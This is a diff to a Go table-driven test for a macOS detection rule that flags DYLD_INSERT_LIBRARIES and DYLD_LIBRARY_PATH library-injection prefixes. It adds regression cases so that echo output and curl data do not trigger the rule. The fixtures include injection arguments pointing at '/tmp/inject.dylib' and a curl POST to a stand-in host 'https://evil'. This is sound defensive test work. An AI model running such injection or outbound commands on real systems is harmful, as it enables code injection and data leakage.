@@ -20,13 +20,13 @@ func TestDyldInsert_TableDriven(t *testing.T) {
 
 	cases := []fixture{
 		{
-			name:        "DYLD_INSERT_LIBRARIES prefix in args fires",
+			name:        "DYLD_INSERT_LIBRARIES leading shell-style prefix fires",
 			path:        "/bin/ls",
 			args:        []string{"DYLD_INSERT_LIBRARIES=/tmp/inject.dylib", "/bin/ls", "-la"},
 			wantFinding: true,
 		},
 		{
-			name:        "DYLD_LIBRARY_PATH prefix in args fires",
+			name:        "DYLD_LIBRARY_PATH through env command fires",
 			path:        "/usr/bin/env",
 			args:        []string{"/usr/bin/env", "DYLD_LIBRARY_PATH=/tmp", "/bin/ls"},
 			wantFinding: true,
@@ -47,6 +47,21 @@ func TestDyldInsert_TableDriven(t *testing.T) {
 			name:        "similar but-not-matching arg does NOT fire",
 			path:        "/bin/ls",
 			args:        []string{"MY_DYLD_INSERT_LIBRARIES=/tmp/inject.dylib", "/bin/ls"},
+			wantFinding: false,
+		},
+		{
+			// Regression: CodeRabbit flagged scanning every argv element as a false-positive
+			// vector. echo / printf are the canonical "data through argv" shapes — the rule
+			// must not fire just because a process prints the variable name.
+			name:        "DYLD_INSERT_LIBRARIES as echo DATA does NOT fire",
+			path:        "/bin/echo",
+			args:        []string{"/bin/echo", "DYLD_INSERT_LIBRARIES=/tmp/inject.dylib"},
+			wantFinding: false,
+		},
+		{
+			name:        "DYLD_INSERT_LIBRARIES in curl --data does NOT fire",
+			path:        "/usr/bin/curl",
+			args:        []string{"/usr/bin/curl", "-X", "POST", "--data", "DYLD_INSERT_LIBRARIES=/tmp/x", "https://evil"},
 			wantFinding: false,
 		},
 	}
